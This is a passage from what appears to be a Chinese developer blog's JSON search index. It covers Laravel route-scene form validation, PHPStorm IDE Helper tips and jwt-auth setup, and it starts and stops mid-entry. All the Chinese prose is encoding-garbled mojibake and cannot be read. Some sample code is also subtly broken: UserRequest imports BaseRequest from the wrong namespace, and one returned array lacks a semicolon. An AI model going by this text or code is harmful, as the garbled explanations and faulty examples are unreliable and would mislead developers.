1composer require \"overtrue/easy-sms\"","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel Request ç±»å®ç°è·¯ç”±åœºæ™¯éªŒè¯","slug":"laravel-request-class-implements-routing-scenario-verification","date":"2021-06-14T08:19:23.000Z","updated":"2021-06-14T08:20:04.773Z","comments":true,"path":"laravel-request-class-implements-routing-scenario-verification/","link":"","permalink":"https://www.0x2beace.com/laravel-request-class-implements-routing-scenario-verification/","excerpt":"åœ¨Laravel ä¸­ï¼Œæœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥éªŒè¯ä¼ å…¥çš„æ•°æ®ï¼Œå¯¹äºè¡¨å•è¯·æ±‚ï¼Œé€šå¸¸ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š åœ¨æ§åˆ¶å™¨ä¸­ä½¿ç”¨ValidatesRequests çš„ validate()æ–¹æ³• åˆ›å»ºè¡¨å•éªŒè¯ç±»","text":"åœ¨Laravel ä¸­ï¼Œæœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥éªŒè¯ä¼ å…¥çš„æ•°æ®ï¼Œå¯¹äºè¡¨å•è¯·æ±‚ï¼Œé€šå¸¸ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š åœ¨æ§åˆ¶å™¨ä¸­ä½¿ç”¨ValidatesRequests çš„ validate()æ–¹æ³• åˆ›å»ºè¡¨å•éªŒè¯ç±» å¯¹äºç¬¬ä¸€ç§æ–¹å¼ï¼Œåªé€‚ç”¨ä¸€äº›åŠŸèƒ½å•ä¸€ã€éªŒè¯è§„åˆ™æ¯”è¾ƒç®€å•çš„éªŒè¯åœºæ™¯ã€‚ å¯¹äºå¤æ‚ä¸€äº›çš„éªŒè¯åœºæ™¯ï¼Œä½¿ç”¨è¡¨å•éªŒè¯ï¼Œä¼šæ›´æ–¹ä¾¿ä¸€äº›ã€‚ ç»å¸¸ä½¿ç”¨è¡¨å•éªŒè¯çš„åŒå­¦å¯èƒ½ä¼šçŸ¥é“ï¼ŒRequest ç±»ä¹Ÿä¸ä¼šä¸‡èƒ½çš„ï¼Œå¯¹äºä¸€äº›é‡å¤ä½¿ç”¨çš„éªŒè¯è§„åˆ™ï¼Œé»˜è®¤çš„Request ç±»ï¼Œå¹¶æ²¡æœ‰æä¾›å¥½çš„éªŒè¯è§„åˆ™å¤ç”¨æ–¹æ³•ã€‚ æ‰€ä»¥æœ‰æ²¡æœ‰æŸç§æ–¹æ¡ˆï¼Œæœ€ç»ˆå¯ä»¥è§£å†³ä»¥ä¸‹éœ€æ±‚ï¼š rules() æ–¹æ³•åªéœ€è¦è¿”å›ä¸€ä¸ªè¯¥è¯·æ±‚çš„éªŒè¯è§„åˆ™æ•°ç»„ åŸºäºè·¯ç”±åœºæ™¯éªŒè¯ï¼Œä¸åŒçš„éªŒè¯åœºæ™¯å¯ä»¥ä½¿ç”¨ç›¸åŒçš„éªŒè¯è§„åˆ™ å¯¹äºå­—æ®µç›¸åŒï¼Œä½†æ˜¯éªŒè¯è§„åˆ™ä¸åŒçš„æƒ…å†µï¼Œå¯ä»¥é‡ç½®éªŒè¯è§„åˆ™ æ„Ÿè°¢ sirping çš„ Laravel éªŒè¯ç±» å®ç° è·¯ç”±åœºæ™¯éªŒè¯ å’Œ æ§åˆ¶å™¨åœºæ™¯éªŒè¯ï¼Œæä¾›äº†ä¸€ä¸ªåŸºäºè·¯ç”±çš„åœºæ™¯éªŒè¯çš„ç®€å•æ˜“ç”¨æ–¹æ¡ˆã€‚ é‡å†™FormRequest ç±»å› ä¸ºæ¯ä¸€ä¸ªRequest ç±»ï¼Œåé¢éƒ½ä¼šä½¿ç”¨åˆ°åœºæ™¯éªŒè¯ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥åˆ›å»ºä¸€ä¸ªåŸºç±»ç»§æ‰¿äº FormRequestç±»ï¼Œå¹¶é‡å†™ç›¸å…³æ–¹æ³•ï¼š app/Http/Requests/BaseRequest.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183&lt;?phpnamespace App\\Http\\Requests;use App\\Traits\\ApiResponse;use Illuminate\\Contracts\\Validation\\Factory as ValidationFactory;use Illuminate\\Contracts\\Validation\\Validator;use Illuminate\\Foundation\\Http\\FormRequest;use Illuminate\\Http\\Exceptions\\HttpResponseException;/** * Class BaseRequest * * @package App\\Http\\Requests */class BaseRequest extends FormRequest&#123; use ApiResponse; /** * @var null */ protected $scene = null; /** * æ˜¯å¦è‡ªåŠ¨éªŒè¯ * * @var bool */ protected $autoValidate = true; /** * @var array */ protected $onlyRule=[]; /** * Determine if the user is authorized to make this request. * * @return bool */ public function authorize() &#123; return true; &#125; /** * @throws \\Illuminate\\Auth\\Access\\AuthorizationException */ public function validateResolved() &#123; if (method_exists($this, 'autoValidate')) &#123; $this-&gt;autoValidate = $this-&gt;container-&gt;call([$this, 'autoValidate']); &#125; if ($this-&gt;autoValidate) &#123; $this-&gt;handleValidate(); &#125; &#125; /** * @throws \\Illuminate\\Auth\\Access\\AuthorizationException */ protected function handleValidate() &#123; $this-&gt;prepareForValidation(); if (! $this-&gt;passesAuthorization()) &#123; $this-&gt;failedAuthorization(); &#125; $instance = $this-&gt;getValidatorInstance(); if ($instance-&gt;fails()) &#123; $this-&gt;failedValidation($instance); &#125; &#125; /** * å®šä¹‰ getValidatorInstance ä¸‹ validator éªŒè¯å™¨ * * @param $factory * @return mixed */ public function validator($factory) &#123; return $factory-&gt;make($this-&gt;validationData(), $this-&gt;getRules(), $this-&gt;messages(), $this-&gt;attributes()); &#125; /** * éªŒè¯æ–¹æ³•ï¼ˆå…³é—­è‡ªåŠ¨éªŒè¯æ—¶æ§åˆ¶å™¨è°ƒç”¨ï¼‰ * * @param string $scene åœºæ™¯åç§° æˆ– éªŒè¯è§„åˆ™ */ public function validate($scene = '') &#123; if (!$this-&gt;autoValidate) &#123; if (is_array($scene)) &#123; $this-&gt;onlyRule = $scene; &#125; else &#123; $this-&gt;scene = $scene; &#125; $this-&gt;handleValidate(); &#125; &#125; /** * è·å– rules * * @return array */ protected function getRules() &#123; return $this-&gt;handleScene($this-&gt;container-&gt;call([$this, 'rules'])); &#125; /** * åœºæ™¯éªŒè¯ * * @param array $rule * @return array */ protected function handleScene(array $rule) &#123; if ($this-&gt;onlyRule) &#123; return $this-&gt;handleRule($this-&gt;onlyRule, $rule); &#125; $sceneName = $this-&gt;getSceneName(); if ($sceneName &amp;&amp; method_exists($this, 'scene')) &#123; $scene = $this-&gt;container-&gt;call([$this, 'scene']); if (array_key_exists($sceneName, $scene)) &#123; return $this-&gt;handleRule($scene[$sceneName], $rule); &#125; &#125; return $rule; &#125; /** * å¤„ç†Rule * * @param array $sceneRule * @param array $rule * * @return array */ private function handleRule(array $sceneRule, array $rule) &#123; $rules = []; foreach ($sceneRule as $key =&gt; $value) &#123; if (is_numeric($key) &amp;&amp; array_key_exists($value, $rule)) &#123; $rules[$value] = $rule[$value]; &#125; else &#123; $rules[$key] = $value; &#125; &#125; return $rules; &#125; /** * è·å–åœºæ™¯åç§° * * @return string */ protected function getSceneName() &#123; return is_null($this-&gt;scene) ? $this-&gt;route()-&gt;getAction('_scene') : $this-&gt;scene; &#125; /** * é€šè¿‡é‡å†™ failedValidationï¼Œæ–¹ä¾¿Request ç±»æŠ›å‡ºå¼‚å¸¸ * * @param Validator $validator * @throws */ protected function failedValidation(Validator $validator) &#123; throw new HttpResponseException( $this-&gt;failed($validator-&gt;errors()-&gt;first()) ); &#125;&#125; å…¶ä¸­ï¼ŒApiResponse æ˜¯ä¸€ä¸ªå°è£…äº†è¿”å›å®¢æˆ·ç«¯å†…å®¹çš„ Traitã€‚ æ·»åŠ è·¯ç”±åœºæ™¯æ–¹æ³•ç„¶ååœ¨ app\\Providers\\AppServiceProvider.php ç±»ä¸­çš„ boot() æ–¹æ³•ä¸­æ·»åŠ åœºæ™¯æ–¹æ³•ï¼š 1234567891011121314151617181920212223242526&lt;?phpnamespace App\\Providers;use Illuminate\\Routing\\Route;use Illuminate\\Support\\ServiceProvider;class AppServiceProvider extends ServiceProvider&#123; // ... /** * Bootstrap any application services. * * @return void */ public function boot() &#123; // æ·»åŠ åœºæ™¯éªŒè¯ scene æ–¹æ³• Route::macro('scene', function ($scene = null) &#123; $action = Route::getAction(); $action['_scene'] = $scene; Route::setAction($action); &#125;); &#125;&#125; ä½¿ç”¨è·¯ç”±åœºæ™¯æ–¹æ³•è¯¥è‡ªå®šä¹‰æ–¹æ³•ç”¨äºè·¯ç”±åœºæ™¯éªŒè¯ï¼Œåœ¨ Route-&gt;action å¢åŠ ä¸€ä¸ª _scene å±æ€§ã€‚å…¶å®ç”¨æ³•å’Œè·¯ç”±åˆ«åå‡½æ•°æ˜¯ä¸€æ ·çš„ï¼š 1Route::post('add','UserController@add')-&gt;scene('add'); è·¯ç”±åœºæ™¯éªŒè¯UserRequest ä½¿ç”¨ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace App\\Http\\Requests;use Illuminate\\Foundation\\Http\\BaseRequest;class UserRequest extends BaseRequest&#123; /** * Determine if the user is authorized to make this request. * * @return bool */ public function authorize() &#123; return true; &#125; /** * Get the validation rules that apply to the request. * * @return array */ public function rules() &#123; // å®šä¹‰éªŒè¯è§„åˆ™ return [ 'name' =&gt; 'required|string|unique:users', 'email' =&gt; 'required|email|unique:users', ]; &#125; /** * åœºæ™¯è§„åˆ™ * * @return array */ public function scene() &#123; // æ ¼å¼ ['åœºæ™¯å' =&gt; [è§„åˆ™]] return [ // add åœºæ™¯ 'add' =&gt; [ 'name', // å¤ç”¨ rules() ä¸‹ name è§„åˆ™ 'email' =&gt; 'email|unique:users' // é‡ç½®è§„åˆ™ ], // editåœºæ™¯ 'edit' =&gt; ['name'], ] &#125;&#125; scene() æ–¹æ³•ä¸­çš„åœºæ™¯ï¼Œä¸æ˜¯æ§åˆ¶å™¨çš„æ–¹æ³•åç§°ï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡è·¯ç”±å»è‡ªå®šä¹‰ï¼Œå¯ä»¥ä½¿ä»»æ„åˆæ³•çš„åç§°ï¼Œä¸ä¸€å®šè¦ä¸æ§åˆ¶å™¨æ–¹æ³•åä¿æŒä¸€è‡´ã€‚ è‡³æ­¤å°±å®Œæˆäº†ä¸Šé¢æåˆ°çš„ä¸‰ä¸ªéœ€æ±‚ï¼Œä½¿ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰ç ´åæ¡†æ¶åŸæœ¬ç”¨æ³•ã€‚ å‚è€ƒé“¾æ¥ Laravel éªŒè¯ç±» å®ç° è·¯ç”±åœºæ™¯éªŒè¯ å’Œ æ§åˆ¶å™¨åœºæ™¯éªŒè¯ ä¿®æ”¹ Laravel FormRequest éªŒè¯ï¼Œå®ç°åœºæ™¯éªŒè¯","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"PHPStorm ä½¿ç”¨æŠ€å·§æ•´ç†","slug":"phpstorm-use-skills-finishing","date":"2021-06-07T15:28:42.000Z","updated":"2021-06-07T15:31:48.602Z","comments":true,"path":"phpstorm-use-skills-finishing/","link":"","permalink":"https://www.0x2beace.com/phpstorm-use-skills-finishing/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç† PHPStorm çš„ä¸€äº›ä½¿ç”¨æŠ€å·§ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç† PHPStorm çš„ä¸€äº›ä½¿ç”¨æŠ€å·§ã€‚ ç±»å‹æç¤ºåœ¨ä½¿ç”¨IDE å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œä¸çŸ¥ä½ æ˜¯å¦æœ‰æ³¨æ„åˆ°è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š 12345public function article()&#123; return $this-&gt;hasMany(User::class)-&gt;where(function($query)&#123; $query-&gt;where('open',1); &#125;);&#125; åœ¨ä½¿ç”¨$query è°ƒç”¨ where æ–¹æ³•æ—¶ï¼Œé»˜è®¤æ˜¯æ²¡æœ‰æç¤ºçš„ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºPHP è¯­è¨€ç‰¹æ€§çš„åŸå› ï¼Œä¸€ä¸ªæ•°ç»„å¯ä»¥å­˜æ”¾å„ç§ç±»å‹çš„å€¼ï¼Œæ— æ³•ä»å¤–éƒ¨çŸ¥é“é‡Œé¢çš„å€¼å…·ä½“æ˜¯ä»€ä¹ˆç±»å‹ï¼Œè¿™å°±å¯¼è‡´IDE æ— æ³•ç»™å‡ºæœ‰æ•ˆçš„æç¤ºäº†ã€‚ å…¶å®è¿™æ—¶æˆ‘ä»¬åªéœ€è¦æ˜¾ç¤ºçš„å‘Šè¯‰IDEï¼Œè¿™ä¸ªå˜é‡å…·ä½“æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œç¼–è¯‘å™¨å°±èƒ½æ­£å¸¸æç¤ºäº†ã€‚ 1/** @var Collection $collection */ IDE HelperLaravel IDE Helper æ˜¯ä¸€ä¸ªä»£ç æç¤ºåŠè¡¥å…¨å·¥å…·ã€‚ åªåœ¨å¼€å‘ç¯å¢ƒä¸­å®‰è£…ï¼š 1composer require --dev barryvdh/laravel-ide-helper å¯¹äºåªåœ¨å¼€å‘ç¯å¢ƒä¸­éœ€è¦å®‰è£…çš„æ‰©å±•åŒ…ï¼Œåœ¨ app/Providers/AppServiceProvider.php æ–‡ä»¶ä¸­ä»¥å¦‚ä¸‹æ–¹å¼è¿›è¡Œæ³¨å†Œï¼š 123456public function register()&#123; if ($this-&gt;app-&gt;environment() !== 'production') &#123; $this-&gt;app-&gt;register(\\Barryvdh\\LaravelIdeHelper\\IdeHelperServiceProvider::class); &#125;&#125; ä¸º Facades ç”Ÿæˆæ³¨é‡Šè¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š 1php artisan ide-helper:generate æ‰§è¡Œå®Œæˆä¹‹åä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª _ide_helper.php æ–‡ä»¶ã€‚ ä¸ºæ¨¡å‹ç”Ÿæˆæ³¨è§£ä½¿ç”¨Laravel ä¸ºæˆ‘ä»¬æä¾›çš„ make:model é»˜è®¤ä¸ä¼šä¸ºåœ¨æ¨¡å‹æ–‡ä»¶ä¸­ï¼Œç”Ÿæˆç›¸åº”çš„æ³¨è§£ã€‚ å½“æˆ‘ä»¬éœ€è¦é€šè¿‡å¯¹è±¡è·å–æ¨¡å‹çš„æŸä¸ªå±æ€§æ—¶ï¼ŒIDE è¿™æ—¶ä¼šæç¤ºæœªå®šä¹‰çš„å±æ€§ï¼Œè™½ç„¶ä¸ä¼šå½±å“åŠŸèƒ½çš„ä½¿ç”¨ï¼Œä½†æ˜¯å¯¹äºå¼€å‘äººå‘˜æ¥è¯´å¹¶ä¸å‹å¥½ã€‚ çœ‹èµ·æ¥å°±åƒè¿™æ ·ï¼š ä½¿ç”¨IDE Helper æ¥ç”Ÿæˆæ¨¡å‹æ³¨è§£ï¼š 123php artisan ide-helper:models \"App\\Models\\UserModel\"Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes/No): (yes/no) [no]: å»ºè®®é€‰æ‹©ã€yesã€ï¼Œå¦åˆ™ä¼šç”Ÿæˆã€Œ_ide_helper_models.phpã€æ–‡ä»¶ï¼Œè¿™æ ·åœ¨è·Ÿè¸ªæ–‡ä»¶çš„æ—¶å€™ä¸ä¼šè·³è½¬åˆ°ã€Œ_ide_helper_models.phpã€æ–‡ä»¶ã€‚ å¦‚æœå¸Œæœ›ä¸ºæ‰€æœ‰æ¨¡å‹éƒ½åŠ ä¸Šæ³¨è§£ï¼Œåˆ™çœç•¥åé¢çš„å‚æ•°ã€‚ çœ‹èµ·æ¥å¥½å¤šäº†ï¼š æ³¨æ„ï¼š ä¸ºæ¨¡å‹ç”Ÿæˆå­—æ®µä¿¡æ¯å¿…é¡»åœ¨æ•°æ®åº“ä¸­å­˜åœ¨ç›¸åº”çš„æ•°æ®è¡¨ã€‚ è‡ªåŠ¨ä¸ºé“¾å¼æ“ä½œæ³¨é‡Š1php artisan ide-helper:meta æ‰§è¡Œå®Œæˆä¹‹åä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª .phpStorm.meta.php æ–‡ä»¶ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"PHPStorm","slug":"PHP/PHPStorm","permalink":"https://www.0x2beace.com/categories/PHP/PHPStorm/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHPStorm","slug":"PHPStorm","permalink":"https://www.0x2beace.com/tags/PHPStorm/"}]},{"title":"Laravel jwt-auth ä½¿ç”¨è¯¦è§£","slug":"laravel-jwt-auth-use-detailed-explanation","date":"2021-06-06T09:11:15.000Z","updated":"2021-06-06T14:25:11.046Z","comments":true,"path":"laravel-jwt-auth-use-detailed-explanation/","link":"","permalink":"https://www.0x2beace.com/laravel-jwt-auth-use-detailed-explanation/","excerpt":"é€šå¸¸åç«¯åœ¨å¼€å‘Api åº”ç”¨æ—¶ï¼Œä¼šç»™å®¢æˆ·ç«¯ä¸€ä¸ªå”¯ä¸€Token è¿›è¡Œæ ‡ç¤ºï¼Œè·å–Token çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä»¥ JWT ä¸ºä¾‹ï¼Œä»‹ç»å…¶æ¦‚å¿µåŠä½¿ç”¨æ–¹æ³•ã€‚","text":"é€šå¸¸åç«¯åœ¨å¼€å‘Api åº”ç”¨æ—¶ï¼Œä¼šç»™å®¢æˆ·ç«¯ä¸€ä¸ªå”¯ä¸€Token è¿›è¡Œæ ‡ç¤ºï¼Œè·å–Token çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä»¥ JWT ä¸ºä¾‹ï¼Œä»‹ç»å…¶æ¦‚å¿µåŠä½¿ç”¨æ–¹æ³•ã€‚ JWTJWT æ˜¯ JSON Web Token çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªéå¸¸è½»å·§çš„è§„èŒƒï¼Œè¿™ä¸ªè§„èŒƒå…è®¸æˆ‘ä»¬ä½¿ç”¨ JWT åœ¨ç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ é€’å®‰å…¨å¯é çš„ä¿¡æ¯ã€‚ JWT ç”±å¤´éƒ¨ï¼ˆheaderï¼‰ã€è½½è·ï¼ˆpayloadï¼‰ä¸ç­¾åï¼ˆsignatureï¼‰ç»„æˆï¼Œä¸€ä¸ª JWT ç±»ä¼¼ä¸‹é¢è¿™æ ·ï¼š 1234567891011121314&#123; &quot;typ&quot;:&quot;JWT&quot;, &quot;alg&quot;:&quot;HS256&quot;&#125;&#123; &quot;iss&quot;:&quot;http:&#x2F;&#x2F;larabbs.test&quot;, &quot;iat&quot;:1515733500, &quot;exp&quot;:1515737100, &quot;nbf&quot;:1515733500, &quot;jti&quot;:&quot;c3U4VevxG2ZA1qhT&quot;, &quot;sub&quot;:1, &quot;prv&quot;:&quot;23bd5c8949f600adb39e701c400872db7a5976f7&quot;&#125;signature å¤´éƒ¨å£°æ˜äº†åŠ å¯†ç®—æ³•ï¼› è½½è·ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„æ•°æ®ï¼Œexp æ˜¯è¿‡æœŸæ—¶é—´ï¼Œsub æ˜¯ JWT çš„ä¸»ä½“ï¼Œè¿™é‡Œå°±æ˜¯ç”¨æˆ·çš„ idï¼› æœ€åçš„ signature æ˜¯ç”±æœåŠ¡å™¨ç”Ÿæˆçš„ç­¾åï¼Œä¿è¯äº† token ä¸è¢«ç¯¡æ”¹ã€‚ è¿™ä¸‰éƒ¨åˆ†æ˜¯åˆ†åˆ«ç”¨ base64url è¿›è¡Œç¼–ç ï¼Œç„¶åé€šè¿‡. ç¬¦å·ç»„åˆåœ¨ä¸€èµ·ï¼Œæœ€åå¾—åˆ°çš„token å¤§æ¦‚æ˜¯è¿™æ ·ï¼š 1xxxxxx.yyyyyy.zzzzzz xã€yã€z éƒ¨åˆ†åˆ†åˆ«ä»£è¡¨äº†å„è‡ªéƒ¨ä½å¯¹åº”çš„ä¿¡æ¯ã€‚ æ³¨æ„âš ï¸ï¼šJWT æœ€åæ˜¯é€šè¿‡ Base64 ç¼–ç çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¯ä»¥è¢«ç¿»è¯‘å›åŸæ¥çš„æ ·å­æ¥çš„ã€‚æ‰€ä»¥ä¸è¦åœ¨ JWT ä¸­å­˜æ”¾ä¸€äº›æ•æ„Ÿä¿¡æ¯ã€‚ æ€è€ƒé¢˜ï¼šToken æ—¢ç„¶ä¼šä¸‹å‘ç»™å®¢æˆ·ç«¯ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ç”¨ä¿å­˜ä¸€ä»½åœ¨æœåŠ¡ç«¯ï¼Ÿ è¿™æ˜¯å› ä¸ºï¼Œå”¯ä¸€çš„ç­¾åä¿å­˜åœ¨æœåŠ¡ç«¯ï¼Œæ‰€ä»¥æ— éœ€æ‹…å¿ƒToken ä¸­çš„ä¿¡æ¯å¯èƒ½è¢«ç¯¡æ”¹ï¼Œæ¸…æ¥šè¿™ä¸€ç‚¹ä¹‹åï¼Œåªéœ€è¦éªŒè¯Token çš„åˆæ³•æ€§ã€‚ Token éªŒè¯æœ‰äº† token ä¹‹åè¯¥å¦‚ä½•éªŒè¯ token çš„æœ‰æ•ˆæ€§ï¼Œå¹¶å¾—åˆ° token å¯¹åº”çš„ç”¨æˆ·å‘¢ï¼Ÿ Laravel ä¸ºæˆ‘ä»¬å‡†å¤‡å¥½äº† auth è¿™ä¸ªä¸­é—´ä»¶ï¼š è·å–å®¢æˆ·ç«¯æäº¤çš„ token æ£€æµ‹ token ä¸­çš„ç­¾å signature æ˜¯å¦æ­£ç¡® åˆ¤æ–­ payload æ•°æ®ä¸­çš„ expï¼Œæ˜¯å¦å·²ç»è¿‡æœŸ æ ¹æ® payload æ•°æ®ä¸­çš„ subï¼ˆç”¨æˆ· IDï¼‰ï¼Œå–æ•°æ®åº“ä¸­éªŒè¯ç”¨æˆ·æ˜¯å¦å­˜åœ¨ ä¸Šè¿°æ£€æµ‹ä¸æ­£ç¡®ï¼Œåˆ™æŠ›å‡ºç›¸åº”å¼‚å¸¸ å¹¶ä¸”å¹¸è¿çš„æ˜¯ï¼Œä¸€äº›å‹¤åŠ³çš„äººï¼Œå·²ç»å¸®æˆ‘ä»¬å®Œæˆäº†è¿™éƒ¨åˆ†å·¥ä½œã€‚ jwt-authjwt-auth æ˜¯ Laravel å’Œ lumen ä¸‹ä¸€ä¸ªä¼˜ç§€ JWT ç»„ä»¶ã€‚ 1composer require tymon/jwt-auth å®‰è£…å®Œæˆåï¼Œéœ€è¦ç”Ÿæˆä¸€ä¸ª JWT çš„ secretï¼Œè¿™ä¸ª secret å¾ˆé‡è¦ï¼Œç”¨äºæœ€åçš„ç­¾åï¼Œæ›´æ¢è¿™ä¸ª secret ä¼šå¯¼è‡´ä¹‹å‰ç”Ÿæˆçš„æ‰€æœ‰ token æ— æ•ˆã€‚ 1php artisan jwt:secret å¯ä»¥çœ‹åˆ°åœ¨ .env æ–‡ä»¶ä¸­ï¼Œå¢åŠ äº†ä¸€è¡Œ JWT_SECRETã€‚ å‘å¸ƒé…ç½®æ–‡ä»¶ï¼š 1php artisan vendor:publish --provider=\"Tymon\\JWTAuth\\Providers\\LaravelServiceProvider\" ä¼šåœ¨config ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªjwt.php çš„é…ç½®æ–‡ä»¶ã€‚ ä¿®æ”¹ config/auth.phpï¼Œå°† api guard çš„ driver æ”¹ä¸º jwtã€‚ 12345678910111213141516171819202122232425262728293031// é»˜è®¤çš„ guard'defaults' =&gt; [ 'guard' =&gt; 'web', 'passwords' =&gt; 'users',],// è‡ªå®šä¹‰ guard'guards' =&gt; [ 'web' =&gt; [ 'driver' =&gt; 'session', 'provider' =&gt; 'users', ], 'api' =&gt; [ 'driver' =&gt; 'jwt', 'provider' =&gt; 'users', ],],// provider çš„ä½œç”¨æ˜¯æŒ‡å®šè®¤è¯æ‰€éœ€çš„æ•°æ®è¡¨æˆ–è€…æ¨¡å‹ï¼Œæ¨èä½¿ç”¨ eloquent'providers' =&gt; [ 'users' =&gt; [ 'driver' =&gt; 'eloquent', 'model' =&gt; App\\User::class, ], // 'users' =&gt; [ // 'driver' =&gt; 'database', // 'table' =&gt; 'users', // ],], å¦‚æœä½ ä½¿ç”¨é»˜è®¤çš„ User æ¨¡å‹æ¥ç”Ÿæˆ tokenï¼Œé‚£ä¹ˆè¯¥æ¨¡å‹éœ€è¦ç»§æ‰¿ Tymon\\JWTAuth\\Contracts\\JWTSubject æ¥å£ï¼Œå¹¶å®ç°æ¥å£çš„ä¸¤ä¸ªæ–¹æ³• getJWTIdentifier() å’Œ getJWTCustomClaims()ã€‚ 12345678910111213141516171819&lt;?phpnamespace App;use Tymon\\JWTAuth\\Contracts\\JWTSubject;use Illuminate\\Foundation\\Auth\\User as Authenticatable;class User extends Authenticatable implements JWTSubject&#123; public function getJWTIdentifier() &#123; return $this-&gt;getKey(); &#125; public function getJWTCustomClaims() &#123; return []; &#125;&#125; getJWTIdentifier è¿”å›äº† User çš„ idï¼ˆç”¨äºç”Ÿæˆ Tokenï¼‰ï¼ŒgetJWTCustomClaims æ˜¯æˆ‘ä»¬éœ€è¦é¢å¤–åœ¨ JWT è½½è·ä¸­å¢åŠ çš„è‡ªå®šä¹‰å†…å®¹ï¼Œè¿™é‡Œè¿”å›ç©ºæ•°ç»„ã€‚ æ‰“å¼€Tinkerï¼Œå°è¯•ç”Ÿæˆä¸€ä¸ª tokenï¼š 1234&gt;&gt;&gt; $user = User::first();&gt;&gt;&gt; Auth::guard('api')-&gt;login($user);=&gt; \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9hdWN0aW9uLnNtaHN3LmxvY2FsIiwiaWF0IjoxNjIyOTY2OTM3LCJleHAiOjE2MjMwNTMzMzcsIm5iZiI6MTYyMjk2NjkzNywianRpIjoibVJKY2wzVWlOMURTQWg2WSIsInN1YiI6MSwicHJ2IjoiMThiMDU4NmY1NWY5YjVhYzc3NmY3MjU3ZTNiODdkMzY2ZjZjNWM3MSJ9.bKFU2T2b-L_nF6uiwb6gZm76aGcWraZ0Bo9O6Xz5Tqw\" é™¤äº†ä¸Šé¢ä»‹ç»çš„è¿™ç§åŸºäºç”¨æˆ·å®ä¾‹ï¼Œè¿”å›Tokençš„æ–¹å¼ï¼Œè¿˜æœ‰å¦å¤–ä¸¤ç§æ–¹å¼å¯ä»¥åˆ›å»ºTokenï¼š åŸºäºè´¦å¯†å‚æ•° 12$credentials = request(['email', 'password']); $token = auth()-&gt;attempt($credentials) åŸºäºæ¨¡å‹ä¸­çš„ç”¨æˆ·ä¸»é”® id 1$token = auth()-&gt;tokenById(1); æ‹¿åˆ°Token ä¹‹åï¼Œæœ‰ä¸¤ç§ä½¿ç”¨æ–¹æ³•ï¼š åŠ åˆ° url ä¸­ï¼š?token=ä½ çš„token åŠ åˆ° authorization æˆ–è€… header ä¸­ï¼Œå»ºè®®ç”¨åè€…ï¼Œå› ä¸ºåœ¨ https æƒ…å†µä¸‹æ›´å®‰å…¨ï¼šAuthorization:Bearer ä½ çš„token jwt-auth æœ‰ä¸¤ä¸ªé‡è¦çš„å‚æ•°ï¼Œå¯ä»¥åœ¨ .env ä¸­è¿›è¡Œè®¾ç½®ï¼š JWT_TTLï¼šç”Ÿæˆçš„ token åœ¨å¤šå°‘åˆ†é’Ÿåè¿‡æœŸï¼Œé»˜è®¤ 60 åˆ†é’Ÿ JWT_REFRESH_TTLï¼šç”Ÿæˆçš„ tokenï¼Œåœ¨å¤šå°‘åˆ†é’Ÿå†…ï¼Œå¯ä»¥åˆ·æ–°è·å–ä¸€ä¸ªæ–° tokenï¼Œé»˜è®¤ 20160 åˆ†é’Ÿï¼Œå³ 14 å¤©ã€‚ è¿™é‡Œè§£é‡Šä¸€ä¸‹è¿™ä¸¤ä¸ªå‚æ•°æ˜¯æ€ä¹ˆå›äº‹ï¼š token çš„è¿‡æœŸæ—¶é—´æ˜¯å‡ºäºå®‰å…¨æ€§è€ƒè™‘ token_refresh 